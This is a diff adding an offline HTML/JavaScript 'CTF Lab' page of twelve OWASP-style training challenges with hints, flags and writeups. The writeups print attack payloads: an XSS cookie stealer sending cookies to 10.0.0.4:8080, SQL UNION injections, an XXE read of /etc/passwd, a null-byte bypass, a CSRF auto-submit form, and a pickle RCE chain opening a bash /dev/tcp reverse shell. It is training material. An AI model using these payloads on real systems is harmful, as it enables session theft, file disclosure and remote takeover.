@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CTF Lab</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#050508;color:#c8ffc8;font-family:'Courier New',Courier,monospace;min-height:100vh}
+.header{text-align:center;padding:32px 20px 16px;border-bottom:1px solid #1e1e30}
+.header h1{font-size:32px;font-weight:900;color:#00ff41;text-shadow:0 0 20px rgba(0,255,65,0.4);letter-spacing:3px}
+.header p{color:#446644;font-size:12px;margin-top:6px;letter-spacing:2px}
+.blink{animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.score-bar{display:flex;justify-content:center;gap:40px;padding:14px;background:#0d0d14;border-bottom:1px solid #1e1e30}
+.score-item{text-align:center}
+.score-val{font-size:22px;color:#00ff41;font-weight:700}
+.score-label{font-size:10px;color:#446644;letter-spacing:1px;text-transform:uppercase}
+.nav-tabs{display:flex;border-bottom:1px solid #1e1e30;background:#0d0d14}
+.tab{padding:11px 22px;cursor:pointer;font-size:11px;color:#446644;border-right:1px solid #1e1e30;transition:all 0.2s;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
+.tab:hover{color:#00ff41;background:rgba(0,255,65,0.05)}
+.tab.active{color:#00ff41;background:rgba(0,255,65,0.08);border-bottom:2px solid #00ff41}
+.main{max-width:1100px;margin:0 auto;padding:20px}
+.section{display:none}
+.section.active{display:block}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px}
+.card{background:#0d0d14;border:1px solid #1e1e30;border-radius:4px;padding:18px;position:relative;transition:all 0.2s;cursor:pointer}
+.card:hover{border-color:#00ff41;box-shadow:0 0 16px rgba(0,255,65,0.08)}
+.card.solved{border-color:rgba(0,255,65,0.4);background:rgba(0,255,65,0.02)}
+.card.solved::after{content:'✓ SOLVED';position:absolute;top:10px;right:10px;font-size:10px;color:#00ff41;letter-spacing:1px}
+.diff{display:inline-block;font-size:10px;padding:2px 7px;border-radius:2px;margin-bottom:8px;letter-spacing:1px}
+.d-easy{background:rgba(0,255,65,0.15);color:#00ff41;border:1px solid #00ff41}
+.d-medium{background:rgba(255,170,0,0.15);color:#ffaa00;border:1px solid #ffaa00}
+.d-hard{background:rgba(255,0,85,0.15);color:#ff0055;border:1px solid #ff0055}
+.d-insane{background:rgba(0,136,255,0.15);color:#0088ff;border:1px solid #0088ff}
+.card h3{font-size:13px;font-weight:700;margin-bottom:6px;color:#c8ffc8}
+.card p{font-size:11px;color:#446644;line-height:1.6;margin-bottom:10px}
+.pts{font-size:11px;color:#ffaa00}
+.cat{font-size:10px;color:#446644;border:1px solid #1e1e30;padding:1px 6px;border-radius:2px}
+.overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.88);z-index:100;justify-content:center;align-items:center}
+.overlay.open{display:flex}
+.modal{background:#0d0d14;border:1px solid #00ff41;border-radius:4px;padding:24px;max-width:660px;width:90%;max-height:82vh;overflow-y:auto;position:relative}
+.modal h2{font-size:16px;color:#00ff41;margin-bottom:5px}
+.modal-x{position:absolute;top:12px;right:12px;background:none;border:none;color:#446644;cursor:pointer;font-size:16px}
+.modal-x:hover{color:#ff0055}
+.challenge-data{background:#020204;border:1px solid #1e1e30;border-radius:4px;padding:14px;margin:10px 0;font-size:11px;white-space:pre-wrap;color:#0088ff;line-height:1.6}
+.hint-wrap{margin:8px 0}
+.hint-wrap summary{cursor:pointer;font-size:11px;color:#ffaa00;padding:8px;background:rgba(255,170,0,0.05);border:1px solid rgba(255,170,0,0.2);border-radius:4px}
+.hint-wrap summary::marker{content:''}
+.hint-wrap summary::before{content:'💡 Hint — click to reveal'}
+.hint-content{padding:10px;font-size:11px;color:#ffaa00;background:rgba(255,170,0,0.05);border:1px solid rgba(255,170,0,0.2);border-top:none;border-radius:0 0 4px 4px}
+.flag-row{display:flex;gap:8px;margin-top:14px}
+.flag-input{flex:1;background:#141420;border:1px solid #1e1e30;border-radius:4px;padding:9px 12px;color:#00ff41;font-family:'Courier New',monospace;font-size:12px;outline:none}
+.flag-input:focus{border-color:#00ff41}
+.flag-input::placeholder{color:#446644}
+.submit-btn{background:#00ff41;color:#000;border:none;border-radius:4px;padding:9px 18px;font-family:'Courier New',monospace;font-size:11px;font-weight:700;cursor:pointer;letter-spacing:1px}
+.submit-btn:hover{background:#00cc34}
+.flag-msg{padding:7px 11px;border-radius:4px;font-size:11px;margin-top:7px;display:none}
+.flag-ok{background:rgba(0,255,65,0.1);border:1px solid #00ff41;color:#00ff41}
+.flag-err{background:rgba(255,0,85,0.1);border:1px solid #ff0055;color:#ff0055}
+.alert{padding:10px 14px;border-radius:4px;font-size:11px;margin:10px 0;border:1px solid}
+.alert-warn{background:rgba(255,170,0,0.1);border-color:rgba(255,170,0,0.3);color:#ffaa00}
+.alert-ok{background:rgba(0,255,65,0.1);border-color:#00ff41;color:#00ff41}
+.wcard{background:#0d0d14;border:1px solid #1e1e30;border-radius:4px;padding:18px;margin-bottom:14px}
+.wcard h3{font-size:13px;color:#00ff41;margin-bottom:10px}
+.step{display:flex;gap:10px;margin-bottom:12px}
+.stepn{width:26px;height:26px;border:1px solid #00ff41;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;color:#00ff41;flex-shrink:0}
+.stepc{flex:1;font-size:11px;line-height:1.7;color:#c8ffc8}
+.codeblock{background:#020204;border:1px solid #1e1e30;border-radius:4px;padding:9px;font-size:10px;color:#0088ff;margin:5px 0;word-break:break-all;white-space:pre-wrap}
+.flagans{background:rgba(0,255,65,0.1);border:1px solid #00ff41;border-radius:4px;padding:7px 11px;font-size:12px;color:#00ff41;margin-top:8px}
+.score-table{width:100%;border-collapse:collapse}
+.score-table th{text-align:left;padding:9px;border-bottom:1px solid #1e1e30;font-size:10px;color:#446644;text-transform:uppercase;letter-spacing:1px}
+.score-table td{padding:9px;border-bottom:1px solid #1e1e30;font-size:11px}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>⚡ CTF LAB <span class="blink">_</span></h1>
+  <p>OWASP Security Training Challenges — Find the flags</p>
+</div>
+
+<div class="score-bar">
+  <div class="score-item"><div class="score-val" id="tscore">0</div><div class="score-label">Points</div></div>
+  <div class="score-item"><div class="score-val" id="tsolv">0</div><div class="score-label">Solved</div></div>
+  <div class="score-item"><div class="score-val">12</div><div class="score-label">Total</div></div>
+  <div class="score-item"><div class="score-val" id="tpct">0%</div><div class="score-label">Completion</div></div>
+</div>
+
+<div class="nav-tabs">
+  <div class="tab active" onclick="showSec('challenges',this)">Challenges</div>
+  <div class="tab" onclick="showSec('writeups',this)">Writeups</div>
+  <div class="tab" onclick="showSec('scoreboard',this)">Scoreboard</div>
+  <div class="tab" onclick="showSec('about',this)">About</div>
+</div>
+
+<div class="main">
+  <div id="sec-challenges" class="section active"><div class="grid" id="cgrid"></div></div>
+
+  <div id="sec-writeups" class="section">
+    <div class="alert alert-warn">Try the challenges first! Writeups reveal solutions.</div>
+    <div id="wcontainer"></div>
+  </div>
+
+  <div id="sec-scoreboard" class="section">
+    <div class="wcard">
+      <h3>Progress</h3>
+      <table class="score-table">
+        <thead>
+          <tr><th>#</th><th>Challenge</th><th>Category</th><th>Points</th><th>Status</th></tr>
+        </thead>
+        <tbody id="stbody"></tbody>
+      </table>
+    </div>
+  </div>
+
+  <div id="sec-about" class="section">
+    <div class="wcard">
+      <h3>About CTF Lab</h3>
+      <p style="font-size:12px;line-height:1.8;margin-top:8px">
+        Practice OWASP Security Toolkit tools in a safe offline environment.<br><br>
+        <strong style="color:#00ff41">How to use:</strong><br>
+        1. Open a challenge<br>
+        2. Read the description and data<br>
+        3. Use OWASP Toolkit tools to find the flag<br>
+        4. Submit in format FLAG{...}<br>
+        5. Check Writeups if stuck<br><br>
+        <strong style="color:#00ff41">Difficulty:</strong><br>
+        🟢 Easy — Basic tool usage (50-75 pts)<br>
+        🟡 Medium — Combining techniques (150-200 pts)<br>
+        🔴 Hard — Multi-step exploitation (300-350 pts)<br>
+        🔵 Insane — Advanced chaining (500 pts)<br><br>
+        <strong style="color:#00ff41">Note:</strong> Progress is saved in memory only — reloading resets score.
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="overlay" id="modal" onclick="if(event.target===this)closeModal()">
+  <div class="modal">
+    <button class="modal-x" onclick="closeModal()">✕</button>
+    <div id="mcontent"></div>
+  </div>
+</div>
+
+<script>
+const challenges=[
+  {id:1,title:"Decode Me",diff:"easy",dclass:"d-easy",cat:"Encoding",pts:50,
+   desc:"We intercepted this encoded string. Decode it to find the flag.",
+   data:"String found in network capture:\n\nRkxBR3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259",
+   hint:"This looks like Base64 encoding. Use the Base64 Decoder in OWASP Toolkit.",
+   flag:"FLAG{base64_is_not_encryption}",
+   steps:[
+     {n:1,t:"Open OWASP Toolkit → Base64/ROT13 tab"},
+     {n:2,t:"Paste into Base64 Decode field:",c:"RkxBR3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259"},
+     {n:3,t:"Click Decode — flag is revealed directly"}
+   ]},
+
+  {id:2,title:"Hash Cracking 101",diff:"easy",dclass:"d-easy",cat:"Crypto",pts:75,
+   desc:"Found this MD5 hash in a database dump. The password is the most common password in the world.",
+   data:"MD5 Hash:\n5f4dcc3b5aa765d61d8327deb882cf99",
+   hint:"Use Hash Generator — type 'password' and check the MD5 output.",
+   flag:"FLAG{password_is_the_worst_password}",
+   steps:[
+     {n:1,t:"Open OWASP Toolkit → Hash Generator"},
+     {n:2,t:"Type 'password' — check MD5:",c:"5f4dcc3b5aa765d61d8327deb882cf99"},
+     {n:3,t:"Match found! Password is 'password'"}
+   ]},
+
+  {id:3,title:"ROT13 Rabbit Hole",diff:"easy",dclass:"d-easy",cat:"Encoding",pts:50,
+   desc:"A message was hidden using a classic cipher found in robots.txt.",
+   data:"Found in robots.txt:\nUser-Agent: FRPERG\nDisallow: /FRPERG-cngu/\n\nNote:\nGur cnffjbeq vf: ybpxrq_va_cynva_fvtug",
+   hint:"ROT13 shifts each letter 13 places. Use ROT13 decoder in Base64/ROT13 tab.",
+   flag:"FLAG{locked_in_plain_sight}",
+   steps:[
+     {n:1,t:"Open OWASP Toolkit → Base64/ROT13"},
+     {n:2,t:"Paste into ROT13 field:",c:"Gur cnffjbeq vf: ybpxrq_va_cynva_fvtug"},
+     {n:3,t:"Result:",c:"The password is: locked_in_plain_sight"}
+   ]},
+
+  {id:4,title:"JWT Exposed",diff:"medium",dclass:"d-medium",cat:"Auth",pts:150,
+   desc:"A web app uses JWT. The server accepts alg:none. Forge a token to become admin.",
+   data:"User JWT:\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ1c2VyIiwiaWRlbnRpdHkiOjQyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\nAdmin panel: 403 - Only 'admin' role allowed",
+   hint:"Use JWT Analyzer → decode token → use Alg:None Forger. The server won't verify the signature!",
+   flag:"FLAG{jwt_alg_none_is_dangerous}",
+   steps:[
+     {n:1,t:"OWASP Toolkit → JWT Analyzer — paste token"},
+     {n:2,t:"Payload shows:",c:'{"user":"test","role":"user","identity":42}'},
+     {n:3,t:"Use Alg:None Forger → generates unsigned token"},
+     {n:4,t:"Forged token ends with empty signature:",c:"eyJ...header.eyJ...payload."}
+   ]},
+
+  {id:5,title:"SQL Union Attack",diff:"medium",dclass:"d-medium",cat:"Injection",pts:200,
+   desc:"Product search is vulnerable to SQLi. Flag is in a secret table. Extract it.",
+   data:"Endpoint: GET /search?q=laptop\nDB: SQLite, 1 column\n' OR 1=1-- returned 19 results\n\nFind the table, then the flag.",
+   hint:"OWASP Toolkit → SQL Injection. Build UNION SELECT for 1 column. Enumerate sqlite_master first.",
+   flag:"FLAG{union_select_from_secret_table}",
+   steps:[
+     {n:1,t:"SQL Injection tool → columns=1, prefix=', table=sqlite_master, extract=name"},
+     {n:2,t:"Payload:",c:"' UNION SELECT name FROM sqlite_master WHERE type='table'--"},
+     {n:3,t:"Find table 'secret_flags', then:",c:"' UNION SELECT flag FROM secret_flags--"}
+   ]},
+
+  {id:6,title:"XSS Cookie Monster",diff:"medium",dclass:"d-medium",cat:"XSS",pts:150,
+   desc:"Stored XSS in product description. Craft a payload to steal session cookies silently.",
+   data:"Target: Product creation form\nField: description (no sanitization)\nAttacker server: http://10.0.0.4:8080\n\nPayload must be invisible to victim.",
+   hint:"XSS Payloads → Cookie stealer type. The img onerror is stealthier than alert().",
+   flag:"FLAG{cookies_stolen_xss_success}",
+   steps:[
+     {n:1,t:"OWASP Toolkit → XSS Payloads → Cookie stealer"},
+     {n:2,t:"Basic:",c:"<script>fetch('http://10.0.0.4:8080/?c='+document.cookie)<\/script>"},
+     {n:3,t:"Stealthy:",c:"<img src=x onerror=\"new Image().src='http://10.0.0.4:8080/?c='+document.cookie\">"}
+   ]},
+
+  {id:7,title:"Null Byte File Escape",diff:"medium",dclass:"d-medium",cat:"File",pts:175,
+   desc:"Server restricts files to .txt only. Target file is credentials.conf. Bypass the restriction.",
+   data:"GET /files/<filename>\nError: Invalid file extension\nOnly .txt and .md allowed\n\nTarget: credentials.conf",
+   hint:"Use Null Byte Bypass tool. %2500 tricks the validator into seeing .txt while reading .conf",
+   flag:"FLAG{null_byte_extension_bypass}",
+   steps:[
+     {n:1,t:"OWASP Toolkit → Null Byte Bypass"},
+     {n:2,t:"URL: http://target.local/files, file: credentials.conf, ext: .txt"},
+     {n:3,t:"Bypass URL:",c:"http://target.local/files/credentials.conf%2500.txt"}
+   ]},
+
+  {id:8,title:"CSRF Profile Takeover",diff:"medium",dclass:"d-medium",cat:"CSRF",pts:175,
+   desc:"Profile update has no CSRF token. Create a malicious page that changes victim username.",
+   data:"POST http://target.local/profile/update\nBody: username=newname\n\nChange username to: hacked_by_ctf",
+   hint:"CSRF PoC Builder → set URL, method POST, field username=hacked_by_ctf, auto-submit ON.",
+   flag:"FLAG{csrf_no_token_no_protection}",
+   steps:[
+     {n:1,t:"OWASP Toolkit → CSRF PoC Builder"},
+     {n:2,t:"URL: http://target.local/profile/update, Method: POST"},
+     {n:3,t:"Fields: username=hacked_by_ctf, Auto-submit: Yes"},
+     {n:4,t:"Generated HTML:",c:'<form action="..." method="POST"><input type="hidden" name="username" value="hacked_by_ctf"></form><script>document.forms[0].submit();<\/script>'}
+   ]},
+
+  {id:9,title:"OAuth Bypass",diff:"hard",dclass:"d-hard",cat:"Auth",pts:300,
+   desc:"OAuth password is generated from email using a predictable algorithm. Target: admin@target.local",
+   data:"POST /rest/user/login\n\nSource code:\npassword = btoa(email.split('').reverse().join(''))\noauth: true\n\nTarget: admin@target.local",
+   hint:"Hash Generator → OAuth Password Calculator. Enter admin@target.local to get the password.",
+   flag:"FLAG{oauth_password_predictable_algorithm}",
+   steps:[
+     {n:1,t:"OWASP Toolkit → Hash Generator → OAuth Calculator"},
+     {n:2,t:"Enter: admin@target.local → reversed → base64"},
+     {n:3,t:"Auto-generated curl:",c:"curl -X POST http://target.local:3000/rest/user/login -d '{\"email\":\"admin@target.local\",\"password\":\"CALCULATED\",\"oauth\":true}'"}
+   ]},
+
+  {id:10,title:"XXE File Read",diff:"hard",dclass:"d-hard",cat:"Injection",pts:300,
+   desc:"XML endpoint is vulnerable to XXE. Read /etc/passwd from the server.",
+   data:"POST /api/search\nContent-Type: text/xml\nNormal: <search>laptop</search>\n\nServer reflects search query in response.\nTarget: /etc/passwd",
+   hint:"XXE Payloads → File Read, context: Search element, file: /etc/passwd",
+   flag:"FLAG{xxe_file_disclosure_critical}",
+   steps:[
+     {n:1,t:"OWASP Toolkit → XXE Payloads → File Read"},
+     {n:2,t:"Target: /etc/passwd, Context: Search element"},
+     {n:3,t:"Payload:",c:'<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<search>&xxe;</search>'}
+   ]},
+
+  {id:11,title:"Email Truncation",diff:"hard",dclass:"d-hard",cat:"Logic",pts:350,
+   desc:"Admin panel requires @corp.internal. Registration truncates to 255 chars. Gain admin access.",
+   data:"Admin: Only @corp.internal allowed\nEmail client: your-id.mail-server.net\nMax stored length: 255 chars\nUse AG3021 as prefix",
+   hint:"Email Truncation Calculator → domain: @corp.internal, client: your-id.mail-server.net, repeat: AG3021",
+   flag:"FLAG{email_truncation_admin_bypass}",
+   steps:[
+     {n:1,t:"OWASP Toolkit → Email Truncation Calculator"},
+     {n:2,t:"@corp.internal = 13 chars, needed prefix: 255-13 = 242 chars of AG3021"},
+     {n:3,t:"After truncation stored email ends with @corp.internal → admin!"}
+   ]},
+
+  {id:12,title:"Pickle RCE Chain",diff:"insane",dclass:"d-insane",cat:"RCE",pts:500,
+   desc:"Python app deserializes pickle at /api/import. Chain: sleep test → reverse shell → flag.txt",
+   data:"POST http://target.local/api/import\nParam: data=<base64_pickle>\n\nPhase 1: Verify with sleep 10\nPhase 2: Reverse shell to 10.0.0.4:4444\nPhase 3: cat /app/flag.txt",
+   hint:"Pickle RCE → sleep test first. Then Reverse Shells → bash /dev/tcp. Set nc -lvnp 4444 first!",
+   flag:"FLAG{pickle_deserialization_rce_pwned}",
+   steps:[
+     {n:1,t:"OWASP Toolkit → Pickle RCE → sleep 10 payload"},
+     {n:2,t:"Send with curl — if 10s delay = RCE confirmed"},
+     {n:3,t:"Reverse Shells → bash /dev/tcp, IP=10.0.0.4, port=4444"},
+     {n:4,t:"Start: nc -lvnp 4444, send pickle payload"},
+     {n:5,t:"In shell: cat /app/flag.txt"}
+   ]}
+];
+
+const solved={};
+
+function escapeHtml(value){
+  return String(value)
+    .replaceAll("&","&amp;")
+    .replaceAll("<","&lt;")
+    .replaceAll(">","&gt;")
+    .replaceAll('"',"&quot;")
+    .replaceAll("'","&#039;");
+}
+
+function updateScore(){
+  let pts=0;
+  let cnt=0;
+
+  challenges.forEach(c=>{
+    if(solved[c.id]){
+      pts+=c.pts;
+      cnt++;
+    }
+  });
+
+  document.getElementById("tscore").textContent=pts;
+  document.getElementById("tsolv").textContent=cnt;
+  document.getElementById("tpct").textContent=Math.round(cnt/challenges.length*100)+"%";
+}
+
+function renderCards(){
+  document.getElementById("cgrid").innerHTML=challenges.map(c=>`
+    <div class="card ${solved[c.id] ? "solved" : ""}" onclick="openC(${c.id})">
+      <span class="diff ${escapeHtml(c.dclass)}">${escapeHtml(c.diff.toUpperCase())}</span>
+      <span class="cat">${escapeHtml(c.cat)}</span>
+      <h3>${escapeHtml(c.title)}</h3>
+      <p>${escapeHtml(c.desc)}</p>
+      <span class="pts">⚡ ${c.pts} pts</span>
+    </div>
+  `).join("");
+}
+
+function openC(id){
+  const c=challenges.find(x=>x.id===id);
+
+  document.getElementById("mcontent").innerHTML=`
+    <span class="diff ${escapeHtml(c.dclass)}">${escapeHtml(c.diff.toUpperCase())}</span>
+    <span class="cat">${escapeHtml(c.cat)}</span>
+    <h2 style="margin-top:8px">${escapeHtml(c.title)} — ${c.pts} pts</h2>
+    <p style="font-size:11px;color:#c8ffc8;margin:10px 0">${escapeHtml(c.desc)}</p>
+    <div class="challenge-data">${escapeHtml(c.data)}</div>
+    <details class="hint-wrap">
+      <summary></summary>
+      <div class="hint-content">${escapeHtml(c.hint)}</div>
+    </details>
+    <div class="flag-row">
+      <input class="flag-input" id="fi-${id}" placeholder="FLAG{...}" onkeydown="if(event.key==='Enter')subFlag(${id})">
+      <button class="submit-btn" onclick="subFlag(${id})">SUBMIT</button>
+    </div>
+    <div class="flag-msg" id="fm-${id}"></div>
+    ${solved[id] ? `<div class="alert alert-ok" style="margin-top:8px">✅ Already solved! +${c.pts} pts</div>` : ""}
+  `;
+
+  document.getElementById("modal").classList.add("open");
+  setTimeout(()=>document.getElementById("fi-"+id)?.focus(),100);
+}
+
+function closeModal(){
+  document.getElementById("modal").classList.remove("open");
+}
+
+function subFlag(id){
+  const c=challenges.find(x=>x.id===id);
+  const input=document.getElementById("fi-"+id).value.trim();
+  const msg=document.getElementById("fm-"+id);
+
+  msg.style.display="block";
+
+  if(input===c.flag){
+    msg.className="flag-msg flag-ok";
+    msg.textContent="✅ CORRECT! +"+c.pts+" points";
+
+    if(!solved[id]){
+      solved[id]=true;
+    }
+
+    updateScore();
+    renderCards();
+    renderScoreboard();
+  }else{
+    msg.className="flag-msg flag-err";
+    msg.textContent="❌ Wrong flag. Keep trying!";
+
+    setTimeout(()=>{
+      msg.style.display="none";
+    },2000);
+  }
+}
+
+function renderWriteups(){
+  document.getElementById("wcontainer").innerHTML=challenges.map(c=>`
+    <div class="wcard">
+      <h3>
+        <span class="diff ${escapeHtml(c.dclass)}">${escapeHtml(c.diff.toUpperCase())}</span>
+        ${escapeHtml(c.title)} — ${c.pts} pts ${solved[c.id] ? "✅" : ""}
+      </h3>
+      <div class="alert alert-warn" style="margin:8px 0">
+        Category: ${escapeHtml(c.cat)} | Use OWASP Toolkit
+      </div>
+      ${c.steps.map(s=>`
+        <div class="step">
+          <div class="stepn">${s.n}</div>
+          <div class="stepc">
+            ${escapeHtml(s.t)}
+            ${s.c ? `<div class="codeblock">${escapeHtml(s.c)}</div>` : ""}
+          </div>
+        </div>
+      `).join("")}
+      <div class="flagans">FLAG: ${escapeHtml(c.flag)}</div>
+    </div>
+  `).join("");
+}
+
+function renderScoreboard(){
+  document.getElementById("stbody").innerHTML=challenges.map(c=>`
+    <tr>
+      <td>${c.id}</td>
+      <td>${escapeHtml(c.title)}</td>
+      <td><span class="cat">${escapeHtml(c.cat)}</span></td>
+      <td style="color:#ffaa00">${c.pts}</td>
+      <td>
+        ${solved[c.id] ? '<span style="color:#00ff41">✅ Solved</span>' : '<span style="color:#446644">— Unsolved</span>'}
+      </td>
+    </tr>
+  `).join("");
+}
+
+function showSec(id,el){
+  document.querySelectorAll(".section").forEach(s=>s.classList.remove("active"));
+  document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
+
+  document.getElementById("sec-"+id).classList.add("active");
+
+  if(el){
+    el.classList.add("active");
+  }
+
+  if(id==="writeups"){
+    renderWriteups();
+  }
+
+  if(id==="scoreboard"){
+    renderScoreboard();
+  }
+}
+
+renderCards();
+updateScore();
+renderScoreboard();
+</script>
+</body>
+</html>
